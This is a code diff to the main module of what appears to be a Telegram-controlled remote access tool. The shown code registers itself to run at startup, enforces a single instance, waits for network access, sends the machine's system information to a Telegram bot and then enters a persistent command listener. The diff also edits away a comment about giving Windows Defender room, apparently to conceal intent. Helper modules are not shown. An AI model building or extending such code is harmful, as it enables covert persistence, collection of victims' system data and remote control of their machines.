@@ -1,5 +1,10 @@
 # main.py
 
+from single_instance import ensure_single_instance
+
+# 🔒 Ensure only one instance runs
+mutex = ensure_single_instance()
+
 from telegram_client import TelegramClient
 from logger import setup_logger
 from startup import add_to_startup
@@ -41,32 +46,27 @@ def main():
     exe_path = get_executable_path()
     add_to_startup(exe_path)
 
-    # Give Defender + system some breathing room
+    # Give system some breathing room
     time.sleep(15)
 
-    # wait for internet
+    # Wait for internet
     if not wait_for_internet(timeout=90):
         logger.error("Startup aborted: No internet")
         return
 
     client = TelegramClient()
 
-    # ✅ STARTUP MESSAGE FIRST
+    # Send startup message
     if not client.send_message(get_system_info(), retries=5, delay=6):
         logger.error("Startup message failed after retries")
     else:
         logger.info("Startup message delivered successfully")
 
-    # cooldown before polling
-    time.sleep(20)
+    # Small cooldown
+    time.sleep(10)
 
-    # optional /ping listener
+    # Enter persistent listener
     client.listen_forever()
-
-    if not client.send_message(get_system_info(), retries=5, delay=6):
-        logger.error("Startup notification ultimately failed")
-
-    logger.info("Application finished execution")
 
 
 if __name__ == "__main__":
